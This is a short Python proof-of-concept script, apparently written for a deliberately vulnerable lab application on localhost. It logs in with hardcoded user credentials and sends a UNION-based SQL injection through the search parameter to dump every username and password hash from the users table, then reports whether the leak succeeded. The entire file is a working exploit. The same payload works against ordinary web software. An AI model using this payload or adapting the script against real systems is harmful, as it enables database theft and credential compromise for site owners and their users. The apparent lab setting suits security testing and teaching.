import sys, requests

# Usage: python poc.py http://localhost/Obscura/vulnerable/app
base = sys.argv[1].rstrip('/')
s = requests.Session()

# log in as a normal user
s.post(f"{base}/login.php", data={"username": "maria", "password": "Maria123!"})

# inject a UNION that pulls the whole users table out through the search box
payload = "') UNION SELECT id, username, password_hash FROM users#"
r = s.get(f"{base}/search.php", params={"q": payload})

if "$2y$" in r.text and "admin" in r.text:
    print("[+] VULNERABLE: leaked usernames + password hashes via SQL injection")
else:
    print("[-] SAFE: injection returned no cross-user data")